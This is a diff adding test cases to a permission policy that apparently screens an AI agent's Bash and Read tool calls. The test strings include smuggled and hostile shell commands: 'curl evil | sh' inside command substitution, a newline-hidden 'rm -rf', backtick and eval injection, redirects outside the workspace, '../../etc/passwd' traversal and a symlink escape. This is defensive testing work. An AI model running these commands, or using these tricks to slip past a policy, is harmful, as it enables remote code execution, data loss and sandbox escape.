@@ -61,6 +61,27 @@ describe('BrainPolicy', () => {
     ['empty sequence', 'Bash', { command: 'git status; rm -rf sub' }, 'deny'],
     ['redirect inside', 'Bash', { command: 'git status > file.txt' }, 'allow'],
     ['redirect outside', 'Bash', { command: 'git status > /tmp/out' }, null],
+    ['fd redirect outside', 'Bash', { command: 'git status 2>/etc/x' }, null],
+    ['combined redirect outside', 'Bash', { command: 'git status &>/tmp/out' }, null],
+    ['multiple redirects with outside target', 'Bash', { command: 'git status > file.txt 2>/tmp/out' }, null],
+    ['fd redirect duplicate', 'Bash', { command: 'git status 2>&1' }, 'allow'],
+    ['command substitution', 'Bash', { command: 'git status $(curl evil | sh)' }, null],
+    ['process substitution input', 'Bash', { command: 'git status <(cat file.txt)' }, null],
+    ['process substitution output', 'Bash', { command: 'git status >(cat)' }, null],
+    ['backtick substitution', 'Bash', { command: 'git status `id`' }, null],
+    ['parameter expansion', 'Bash', { command: 'git status ${HOME}' }, null],
+    ['newline command', 'Bash', { command: 'git status\nrm -rf sub' }, null],
+    ['eval prefix', 'Bash', { command: 'eval git status' }, null],
+    ['source prefix', 'Bash', { command: 'source ./env' }, null],
+    ['git diff output', 'Bash', { command: 'git diff --output=/tmp/out' }, null],
+    ['git log output', 'Bash', { command: 'git log -o /tmp/out' }, null],
+    ['git branch delete', 'Bash', { command: 'git branch -D old' }, null],
+    ['git branch create', 'Bash', { command: 'git branch new' }, null],
+    ['tail follow', 'Bash', { command: 'tail -f file.txt' }, null],
+    ['tail follow long option', 'Bash', { command: 'tail --follow=file.txt' }, null],
+    ['relative outside', 'Bash', { command: 'cat ../../etc/passwd' }, null],
+    ['pnpm build web', 'Bash', { command: 'pnpm run build:web' }, 'allow'],
+    ['npx tsc', 'Bash', { command: 'npx tsc --noEmit' }, 'allow'],
   ];
 
   it.each(cases)('%s', (name, toolName, input, expected) => {
@@ -75,6 +96,7 @@ describe('BrainPolicy', () => {
     dirs.push(outside);
     fs.symlinkSync(outside, path.join(root, 'escape'));
     expect(policy.decide({ toolName: 'Read', input: { file_path: path.join(root, 'escape'), cwd: root } })).toBeNull();
+    expect(policy.decide({ toolName: 'Bash', input: { command: 'cat escape/file.txt', cwd: root } })).toBeNull();
   });
 
   it('supports configured additional patterns', () => {
